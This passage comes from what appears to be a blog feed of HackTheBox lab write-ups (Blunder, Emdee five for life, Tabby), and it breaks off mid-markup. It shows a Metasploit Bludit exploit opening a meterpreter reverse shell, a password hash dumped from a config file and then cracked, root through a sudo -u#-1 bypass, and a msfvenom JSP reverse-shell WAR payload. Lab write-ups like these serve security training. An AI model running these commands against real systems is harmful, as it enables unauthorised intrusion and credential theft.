class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search bludit</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                          Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/linux/http/bludit_upload_images_exec</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; use exploit/linux/http/bludit_upload_images_exec</span><br><span class="line">[*] Using configured payload php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/bludit_upload_images_exec):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   BLUDITPASS                   yes       The password for Bludit</span><br><span class="line">   BLUDITUSER                   yes       The username for Bludit</span><br><span class="line">   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT       80               yes       The target port (TCP)</span><br><span class="line">   SSL         false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI   /                yes       The base path for Bludit</span><br><span class="line">   VHOST                        no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.87.24.78      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Bludit v3.9.2</span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bludituser fergus</span><br><span class="line">bludituser =&gt; gergus</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bluditpass RolandDeschain</span><br><span class="line">bluditpass =&gt; RolandDeschain</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set rhosts 10.10.10.191</span><br><span class="line">rhosts =&gt; 10.10.10.191</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set lhost 10.10.17.216</span><br><span class="line">lhost =&gt; 10.10.17.216</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/bludit_upload_images_exec):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   BLUDITPASS  RolandDeschain   yes       The password for Bludit</span><br><span class="line">   BLUDITUSER  fergus           yes       The username for Bludit</span><br><span class="line">   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS      10.10.10.191     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT       80               yes       The target port (TCP)</span><br><span class="line">   SSL         false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI   /                yes       The base path for Bludit</span><br><span class="line">   VHOST                        no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Bludit v3.9.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:4444 </span><br><span class="line">[-] Exploit aborted due to failure: no-access: Authentication failed</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; set bludituser fergus</span><br><span class="line">bludituser =&gt; fergus</span><br><span class="line">msf5 exploit(linux/http/bludit_upload_images_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:4444 </span><br><span class="line">[+] Logged in as: fergus</span><br><span class="line">[*] Retrieving UUID...</span><br><span class="line">[*] Uploading ELlQyVUzyq.png...</span><br><span class="line">[*] Uploading .htaccess...</span><br><span class="line">[*] Executing ELlQyVUzyq.png...</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.191</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.17.216:4444 -&gt; 10.10.10.191:50490) at 2020-09-18 22:16:21 -0400</span><br><span class="line">[+] Deleted .htaccess</span><br><span class="line"></span><br><span class="line">meterpreter &gt; id</span><br><span class="line">[-] Unknown command: id.</span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line">[-] Unknown command: whoami.</span><br></pre></td></tr></table></figure><p><code>www用户没有权限</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3590 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ </span><br><span class="line"></span><br><span class="line">www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">www-data@blunder:/home$ ls</span><br><span class="line">ls</span><br><span class="line">hugo  shaun</span><br><span class="line">www-data@blunder:/home$ cd hugo</span><br><span class="line">cd hugo</span><br><span class="line">www-data@blunder:/home/hugo$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  user.txt</span><br><span class="line">Documents  Music      Public    Videos</span><br><span class="line">www-data@blunder:/home/hugo$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">www-data@blunder:/home/hugo$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">www-data@blunder:/home$ ls</span><br><span class="line">ls</span><br><span class="line">hugo  shaun</span><br><span class="line">www-data@blunder:/home$ cd shaun</span><br><span class="line">cd shaun</span><br><span class="line">www-data@blunder:/home/shaun$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos</span><br><span class="line">www-data@blunder:/home/shaun$</span><br></pre></td></tr></table></figure><p><code>下面查找bludit配置文件，寻找用户hash密码</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">www-data@blunder:/home/shaun$ cd /var/www/</span><br><span class="line">cd /var/www/</span><br><span class="line">www-data@blunder:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">bludit-3.10.0a  bludit-3.9.2  html</span><br><span class="line">www-data@blunder:/var/www$ cd bbludit-3.10.0a^[[D</span><br><span class="line">cd bbludit-3.10.0a</span><br><span class="line">bash: cd: bbludit-3.10.0a: No such file or directory</span><br><span class="line">www-data@blunder:/var/www$ cd bludit-3.10.0a</span><br><span class="line">cd bludit-3.10.0a</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a$ ls</span><br><span class="line">ls</span><br><span class="line">LICENSE    bl-content  bl-languages  bl-themes  install.php</span><br><span class="line">README.md  bl-kernel   bl-plugins    index.php</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a$ cd bl-content</span><br><span class="line">cd bl-content</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ ls</span><br><span class="line">ls</span><br><span class="line">databases  pages  tmp  uploads  workspaces</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content$ cd databases</span><br><span class="line">cd databases</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ ls</span><br><span class="line">ls</span><br><span class="line">categories.php  plugins       site.php    tags.php</span><br><span class="line">pages.php       security.php  syslog.php  users.php</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php</span><br><span class="line">cat users.php</span><br><span class="line">&lt;?php defined(&#x27;BLUDIT&#x27;) or die(&#x27;Bludit CMS.&#x27;); ?&gt;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;admin&quot;: &#123;</span><br><span class="line">        &quot;nickname&quot;: &quot;Hugo&quot;,</span><br><span class="line">        &quot;firstName&quot;: &quot;Hugo&quot;,</span><br><span class="line">        &quot;lastName&quot;: &quot;&quot;,</span><br><span class="line">        &quot;role&quot;: &quot;User&quot;,</span><br><span class="line">        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,</span><br><span class="line">        &quot;email&quot;: &quot;&quot;,</span><br><span class="line">        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,</span><br><span class="line">        &quot;tokenRemember&quot;: &quot;&quot;,</span><br><span class="line">        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,</span><br><span class="line">        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,</span><br><span class="line">        &quot;twitter&quot;: &quot;&quot;,</span><br><span class="line">        &quot;facebook&quot;: &quot;&quot;,</span><br><span class="line">        &quot;instagram&quot;: &quot;&quot;,</span><br><span class="line">        &quot;codepen&quot;: &quot;&quot;,</span><br><span class="line">        &quot;linkedin&quot;: &quot;&quot;,</span><br><span class="line">        &quot;github&quot;: &quot;&quot;,</span><br><span class="line">        &quot;gitlab&quot;: &quot;&quot;&#125;</span><br><span class="line">&#125;</span><br><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$`</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==">解码地址<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>hash值：faca404fd5c0a31cf1897b823c695c85cffeb98d</p><p>用户：Hugo</p><p>解码：Password120</p></blockquote><h2 id="0x010-提权"><a href="#0x010-提权" class="headerlink" title="0x010.提权"></a>0x010.提权</h2><p><code>Hugo登入</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">hugo  shaun</span><br><span class="line">www-data@blunder:/home$ su hugo</span><br><span class="line">su hugo</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">hugo@blunder:/home$ whoami</span><br><span class="line">whoami</span><br><span class="line">hugo</span><br><span class="line">hugo@blunder:/home$ ls</span><br><span class="line">ls</span><br><span class="line">hugo  shaun</span><br><span class="line">hugo@blunder:/home$ <span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">hugo@blunder:~$ ls</span><br><span class="line">ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  Videos</span><br><span class="line">Documents  Music      Public    user.txt</span><br><span class="line">hugo@blunder:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">***************************</span><br><span class="line">hugo@blunder:~$ </span><br></pre></td></tr></table></figure><p><code>利用/bin/bash提权</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> hugo on blunder:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User hugo may run the following commands on blunder:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br><span class="line">hugo@blunder:~$ sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">root@blunder:/home/hugo<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@blunder:/home/hugo<span class="comment"># cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">root@blunder:/<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">bin    dev  home   lib64       media  proc  sbin  sys  var</span><br><span class="line">boot   etc  lib    libx32      mnt    root  snap  tmp</span><br><span class="line">cdrom  ftp  lib32  lost+found  opt    run   srv   usr</span><br><span class="line">root@blunder:/<span class="comment"># cd root</span></span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">root@blunder:/root<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">root@blunder:/root<span class="comment"># cat root.txt</span></span><br><span class="line">cat root.txt</span><br><span class="line">*************************************</span><br><span class="line">root@blunder:/root<span class="comment"># </span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-概述&quot;&gt;&lt;a href=&quot;#0x01-概述&quot; class=&quot;headerlink&quot; title=&quot;0x01.概述&quot;&gt;&lt;/a&gt;0x01.概述&lt;/h2&gt;&lt;img src=&quot;/2020/09/19/HTB-blunder/image-20200918203836239.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[Emdee_five_for_life]</title>
    <link href="https://lunamoore.github.io/2020/09/18/Emdee-five-for-life/"/>
    <id>https://lunamoore.github.io/2020/09/18/Emdee-five-for-life/</id>
    <published>2020-09-18T12:04:37.000Z</published>
    <updated>2020-09-19T00:08:30.782Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Emdee-five-for-life"><a href="#Emdee-five-for-life" class="headerlink" title="Emdee five for life"></a><span class="exturl" data-url="aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5ldS9jaGFsbGVuZ2VzLzY3">Emdee five for life<i class="fa fa-external-link-alt"></i></span></h2><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/emdee<span class="comment"># cat ctf.py </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&quot;http://docker.hackthebox.eu:31569/&quot;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">out=r.get(url)</span><br><span class="line">outl=re.search(<span class="string">r&quot;&lt;h3 align=&#x27;center&#x27;&gt;(\w*)&lt;/h3&gt;&quot;</span>,out.text)</span><br><span class="line">outll=hashlib.md5(outl.group(<span class="number">1</span>).encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">print(<span class="string">&quot;sending md5 : &#123;&#125;&quot;</span>.format(outll))</span><br><span class="line">data=&#123;<span class="string">&#x27;hash&#x27;</span>:outll&#125;</span><br><span class="line">out=r.post(url=url,data=data)</span><br><span class="line">print(out.text)</span><br><span class="line">root@JIYE:~/htb/emdee<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/emdee<span class="comment"># python3 ctf.py </span></span><br><span class="line">sending md5 : d92889d19659d8095201121281d6e98b</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;emdee five for life&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body style=<span class="string">&quot;background-color:powderblue;&quot;</span>&gt;</span><br><span class="line">&lt;h1 align=&#x27;center&#x27;&gt;MD5 encrypt this string&lt;/h1&gt;&lt;h3 align=&#x27;center&#x27;&gt;xcx4vl6glkWdxhQePelZ&lt;/h3&gt;&lt;p align=&#x27;center&#x27;&gt;HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;&lt;/p&gt;&lt;center&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;hash&quot; placeholder=&quot;MD5&quot; align=&#x27;center&#x27;&gt;&lt;/input&gt;</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;/form&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/emdee<span class="comment">#</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Emdee-five-for-life&quot;&gt;&lt;a href=&quot;#Emdee-five-for-life&quot; class=&quot;headerlink&quot; title=&quot;Emdee five for life&quot;&gt;&lt;/a&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5ldS9jaGFsbGVuZ2VzLzY3&quot;&gt;Emdee five for life&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/h2&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[tabby]</title>
    <link href="https://lunamoore.github.io/2020/09/11/HTB-tabby/"/>
    <id>https://lunamoore.github.io/2020/09/11/HTB-tabby/</id>
    <published>2020-09-11T02:28:33.000Z</published>
    <updated>2020-09-11T02:44:59.983Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2020/09/11/HTB-tabby/image-20200909145742353.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>可以看开放了22/80/8080(tomcat)端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># nmap -sC -sV -sT 10.10.10.194 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-09 02:59 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.194</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Mega Hosting</span><br><span class="line">8080/tcp open  http    Apache Tomcat</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Apache Tomcat</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 67.64 seconds</span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x02-先访问80端口"><a href="#0x02-先访问80端口" class="headerlink" title="0x02.先访问80端口"></a>0x02.先访问80端口</h2><p><code>发现是一个卖服务器的</code></p><img src="/2020/09/11/HTB-tabby/image-20200909151511868.png" class><p><code>手动爬虫，发现NEW页面不能访问，并跳转到了如下页面</code></p><img src="/2020/09/11/HTB-tabby/image-20200909151641647.png" class><p><code>添加一条hosts再访问，提到了数据泄露，并且感觉存在文件包含</code></p><blockquote><p>10.10.10.194    megahosting.htb</p></blockquote><img src="/2020/09/11/HTB-tabby/image-20200909162808330.png" class><p><code>测试文件包含，是确实存在的</code></p><img src="/2020/09/11/HTB-tabby/image-20200909163047232.png" class><h2 id="0x03-访问tomcat"><a href="#0x03-访问tomcat" class="headerlink" title="0x03.访问tomcat"></a>0x03.访问tomcat</h2><h3 id="1-发现敏感目录及文件"><a href="#1-发现敏感目录及文件" class="headerlink" title="1.发现敏感目录及文件"></a>1.发现敏感目录及文件</h3><blockquote><p>/var/lib/tomcat9/webapps/ROOT/index.html</p><p>/usr/share/tomcat9</p><p>/var/lib/tomcat9</p><p>/usr/share/doc/tomcat9-common/RUNNING.txt.gz</p><p>/etc/tomcat9/tomcat-users.xml</p></blockquote><img src="/2020/09/11/HTB-tabby/image-20200909170452209.png" class><h3 id="2-包含敏感文件"><a href="#2-包含敏感文件" class="headerlink" title="2.包含敏感文件"></a>2.包含敏感文件</h3><p><code>百度发现tomcat-users.xml为用户登录配置文件</code></p><blockquote><p>经过不懈努力发现文件位置</p><p>/usr/share/tomcat9/etc/tomcat-users.xml</p></blockquote><p><code>查看源码发现用户密码</code></p><img src="/2020/09/11/HTB-tabby/image-20200909172907375.png" class><h2 id="0x04-构造exploit"><a href="#0x04-构造exploit" class="headerlink" title="0x04.构造exploit"></a>0x04.构造exploit</h2><p><span class="exturl" data-url="aHR0cHM6Ly90b21jYXQuYXBhY2hlLm9yZy90b21jYXQtNy4wLWRvYy9tYW5hZ2VyLWhvd3RvLmh0bWwjU3VwcG9ydGVkX01hbmFnZXJfQ29tbWFuZHM=">tomcat相关参考<i class="fa fa-external-link-alt"></i></span></p><img src="/2020/09/11/HTB-tabby/image-20200909180557612.png" class><p><code>生成exp</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/tabby<span class="comment"># msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.17.216 lport=6666 -f war &gt; exp.war</span></span><br><span class="line">Payload size: 1086 bytes</span><br><span class="line">Final size of war file: 1086 bytes</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/tabby<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>上传exp</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 